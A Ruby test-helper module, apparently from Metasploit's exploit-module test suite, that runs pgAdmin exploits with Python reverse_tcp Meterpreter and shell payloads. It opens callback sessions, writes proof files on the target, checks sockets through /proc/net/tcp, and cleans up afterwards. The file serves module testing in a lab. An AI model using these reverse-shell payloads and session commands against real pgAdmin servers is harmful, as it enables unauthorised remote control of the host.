# frozen_string_literal: true

# Real typed sessions and target-side socket/file recovery for pgAdmin.
module PgAdminSessionPayloads
  def rc_command(label, role, *arguments, required: true)
    arguments[0] = '/venv/bin/python3' if role == 'linux' && arguments.first == 'python3'
    super(label, role == 'linux' ? 'app' : role, *arguments, required: required)
  end

  def pa_session_setup
    @rc[:payload_source] = rc_json('begin;files=%w[meterpreter.py ext_server_stdapi.py].to_h{|name|path=MetasploitPayloads.path("meterpreter",name);[name,{path:path,sha256:Digest::SHA256.file(path).hexdigest}]};{gem:Gem.loaded_specs.fetch("metasploit-payloads").version.to_s,files:files};end')
    rc_callback
    @observer = rc_json('begin;load "test/module_targets/druid_sessions/session_control.rb";DruidSessionControl.install(framework);end')
    @rc[:sessions] = []
  end

  def pa_port
    server = TCPServer.new(@rc.fetch(:callback).fetch(:bind), 0)
    server.local_address.ip_port
  ensure
    server&.close
  end

  def pa_tcp(port)
    code = "import json,sys;rows=[];port=int(sys.argv[1]);lines=open('/proc/net/tcp').read().splitlines()[1:];[rows.append({'remote':v[2],'state':v[3],'uid':int(v[7]),'inode':v[9]}) for v in [line.split() for line in lines] if int(v[2].split(':')[1],16)==port and int(v[7])==5050];print(json.dumps(rows))"
    output, = rc_command('session-tcp-state', 'app', '/venv/bin/python3', '-c', code, port.to_s)
    JSON.parse(output)
  end

  def pa_session(label, family, reuse: false)
    payload = { 'staged' => 'python/meterpreter/reverse_tcp', 'single' => 'python/meterpreter_reverse_tcp', 'shell' => 'python/shell_reverse_tcp' }.fetch(family)
    callback = @rc.fetch(:callback)
    port = pa_port
    expect(pa_tcp(port)).to eq([])
    options = { 'PAYLOAD' => payload, 'LHOST' => callback.fetch(:host), 'LPORT' => port, 'ReverseListenerBindAddress' => callback.fetch(:bind), 'DisablePayloadHandler' => false, 'AutoCheck' => !reuse, 'WfsDelay' => 15 }
    output = pa_call(label, options, reuse: reuse)
    expect(output).not_to include('Exploit failed', 'Exploit aborted', 'no session was created', 'Unknown datastore option')
    expected_type = family == 'shell' ? 'shell' : 'meterpreter'
    metadata = rc_poll(30) do
      sessions = rc_json('framework.sessions.map{|id,s|{id:id,type:s.type,owner:s.via_exploit,payload:s.via_payload,klass:s.class.name}}')
      events = File.readlines(@observer.fetch('ready_event_path')).map { |line| JSON.parse(line) }
      sessions.find { |row| row.fetch('type') == expected_type && events.any? { |event| event.fetch('id') == row.fetch('id') } }
    end
    expect(metadata.values_at('owner', 'payload')).to eq([rc_owner, 'payload/' + payload])
    identifier = metadata.fetch('id')
    proof = "/tmp/module-target-druid-session-#{Process.pid}_#{identifier}-#{identifier}"
    expect(pa_file(proof).fetch('exists')).to be(false)
    if expected_type == 'shell'
      result = rc_json("DruidSessionControl.proof(framework,#{identifier},#{proof.inspect})")
      expected = 'druid-session'
    else
      channels = rc_json("framework.sessions.fetch(#{identifier}).channels.keys.sort")
      result = rc_json("begin;s=framework.sessions.fetch(#{identifier});f=nil;begin;f=s.fs.file.new(#{proof.inspect},'wb');f.write('pgadmin-session');ensure;f.close if f;end;{pid:s.sys.process.getpid,identity:s.sys.config.getuid,platform:s.platform};end")
      expect(rc_json("framework.sessions.fetch(#{identifier}).channels.keys.sort")).to eq(channels)
      expected = 'pgadmin-session'
    end
    expect(pa_file(proof)).to eq('exists' => true, 'uid' => 5050, 'base64' => Base64.strict_encode64(expected))
    sockets = pa_tcp(port)
    expect(sockets).to include(include('state' => '01', 'uid' => 5050))
    @rc.fetch(:sessions) << { label: label, **metadata, proof: result, socket: sockets, port: port }
    uploads = rc_json('framework.instance_variable_get(:@pgadmin_events)').select { |event| event['upload_path'] }
    uploads.each { |event| expect(pa_file(event.fetch('upload_path')).fetch('exists')).to be(false) }
    rc_save
  ensure
    rc_command('remove-session-proof', 'app', 'rm', '-f', proof) if proof
    expect(pa_file(proof).fetch('exists')).to be(false) if proof
    begin
      if identifier
        # Public termination sends Meterpreter shutdown and closes the local peer.
        rc_json("begin;s=framework.sessions[#{identifier}];s.kill if s;{closed:#{identifier}};end")
        rc_poll(15) { pa_tcp(port).none? { |socket| %w[01 08].include?(socket.fetch('state')) } }
      end
    ensure
      console_command('jobs -K')
      expect(rc_json('{sessions:framework.sessions.keys,jobs:framework.jobs.keys}')).to eq('sessions' => [], 'jobs' => [])
      rc_resources(label)
      rc_save
    end
  end
end
